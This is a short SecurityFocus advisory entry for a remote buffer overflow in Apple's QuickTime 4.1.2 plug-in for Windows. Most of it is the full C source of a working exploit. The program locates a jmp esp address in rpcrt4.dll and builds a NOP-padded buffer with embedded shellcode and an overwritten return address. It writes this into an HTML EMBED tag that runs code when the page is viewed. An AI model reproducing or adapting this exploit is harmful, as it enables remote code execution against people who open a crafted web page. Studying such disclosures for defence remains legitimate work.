source: http://www.securityfocus.com/bid/2328/info

Apple Quicktime plugin for Windows is vulnerable to a remote buffer overflow.

A maliciously-constructed web link statement in a remote HTML document, which contains excess data argumenting an EMBED tag, could permit execution of hostile code. 

/*====================================================================
   Apple QuickTime 4.1.2 plug-in exploit
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  ====================================================================
*/

#include    <stdio.h>
#include    <stdlib.h>
#include    <windows.h>

#define MOV_FILE    "c:\\program files\\quicktime\\sample.mov"
#define HEIGHT      60
#define WIDTH       60
#define TARGET      "QUICKTIMEPLAYER"
#define FILE_IMAGE  \
                    "<html><embed src=\"%s\" href=\"%s\" "\
                    "width=%d height=%d autoplay=\"true\" "\
                    "target=\"%s\"><br></html>"
#define BUFSIZE     730
#define RET         684
#define ESP_TGT     "rpcrt4.dll"
#define JMPESP_1    0xff
#define JMPESP_2    0xe4
#define NOP         0x90

unsigned char   exploit_code[200]={
        0x33,0xC0,0x40,0x40,0x40,0x40,0x40,0x50,
        0x50,0x90,0xB8,0x2D,0x23,0xF5,0xBF,0x48,
        0xFF,0xD0,0x00,
};

main(int argc,char *argv[])
{
    FILE            *fp;
    char            buf[BUFSIZE];
    unsigned int    i,pretadr,p,ip,kp;
    MEMORY_BASIC_INFORMATION meminfo;

    if (argc<2){
        printf("usage : %s Output_HTML-fileName [Sample .mov file]\n",
               argv[0]);
        exit(1);
    }

    if ((void *)(kp=(unsigned int)LoadLibrary(ESP_TGT))==NULL){
         printf("%s is not found.\n",ESP_TGT);
         exit(1);
    }

    VirtualQuery((void *)kp,&meminfo,sizeof(MEMORY_BASIC_INFORMATION));
    pretadr=0;
    for (i=0;i<meminfo.RegionSize;i++){
        p=kp+i;
        if (  ( p     &0xff)==0
           || ((p>>8 )&0xff)==0
           || ((p>>16)&0xff)==0
           || ((p>>24)&0xff)==0) continue;
        if (   *((unsigned char *)p)==JMPESP_1
            && *(((unsigned char *)p)+1)==JMPESP_2)
            pretadr=p;
    }
    if ((fp=fopen(argv[1],"wb"))==NULL){
        printf("File write error \"%s\"\n",argv[1]);
        exit(1);
    }
    memset(buf,NOP,BUFSIZE);
    memcpy(buf+700-12,exploit_code,strlen(exploit_code));
    buf[BUFSIZE-2]=0;

    ip=pretadr;
    printf("EIP=%x\n",ip);
    buf[RET  ]=ip&0xff;
    buf[RET+1]=(ip>>8)&0xff;
    buf[RET+2]=(ip>>16)&0xff;
    buf[RET+3]=(ip>>24)&0xff;

    if (argc==2)
        fprintf(fp,FILE_IMAGE,MOV_FILE,buf,WIDTH,HEIGHT,TARGET);
    else
        fprintf(fp,FILE_IMAGE,argv[2],buf,WIDTH,HEIGHT,TARGET);
    fclose(fp);
    printf("Done.\n");
 }

-----
UNYUN
% The Shadow Penguin Security [ http://shadowpenguin.backsection.net ]
   shadowpenguin@backsection.net (SPS-Official)
   unyun@shadowpenguin.org (Personal)
% eEye Digital Security Team [ http://www.eEye.com ]
   unyun@eEye.com
